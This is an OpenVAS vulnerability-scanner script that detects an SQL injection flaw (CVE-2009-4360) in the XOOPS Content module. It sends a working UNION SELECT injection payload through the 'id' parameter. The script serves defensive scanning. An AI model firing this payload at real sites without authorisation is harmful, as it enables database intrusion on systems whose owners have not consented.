###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_xoops_content_module_sql_inj_vuln.nasl 5952 2017-04-13 12:34:17Z cfi $
#
# XOOPS Content Module SQL Injection Vulnerability
#
# Authors:
# Sujit Ghosal <sghosal@secpod.com>
#
# Copyright:
# Copyright (c) 2009 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:xoops:xoops";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900732");
  script_version("$Revision: 5952 $");
  script_tag(name:"last_modification", value:"$Date: 2017-04-13 14:34:17 +0200 (Thu, 13 Apr 2017) $");
  script_tag(name:"creation_date", value:"2009-12-24 14:01:59 +0100 (Thu, 24 Dec 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-4360");
  script_bugtraq_id(37155);
  script_name("XOOPS Content Module SQL Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_xoops_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("XOOPS/installed");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/54489");
  script_xref(name:"URL", value:"http://securityreason.com/exploitalert/7494");
  script_xref(name:"URL", value:"http://www.packetstormsecurity.org/0911-exploits/xoopscontent-sql.txt");

  tag_impact = "Successful exploitation will let the remote attacker to execute arbitrary SQL
  queires to compromise the remote machine running the vulnerable application.

  Impact Level: Application";

  tag_affected = "XOOPS 'Content' Module 0.5";

  tag_insight = "This flaw is due to improper sanitization of data inside 'Content'
  module within the 'id' parameter which lets the remote unauthenticated
  user to run arbitrary SQL Commands.";

  tag_solution = "No solution or patch was made available for at least one year
  since disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.";

  tag_summary = "This host is running XOOPS and is prone to SQL Injection
  vulnerability.";

  script_tag(name:"summary", value:tag_summary);
  script_tag(name:"insight", value:tag_insight);
  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"affected" , value:tag_affected);
  script_tag(name:"solution", value:tag_solution);

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";
url = dir + "/modules/content/index.php?id=1";
req = http_get( item:url, port:port );
res = http_keepalive_send_recv( port:port, data:req );

if( "blockContent" >< res && "blockTitle" >< res ) {

  url = dir + "/modules/content/index.php?id=-1+UNION+SELECT+1,2,3,@@version,5,6,7,8,9,10,11--";
  req = http_get( item:url, port:port );
  res = http_keepalive_send_recv( port:port, data:req );

  if( "Set-Cookie: " >< res && "PHPSESSID" >< res && "path=/" >< res ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );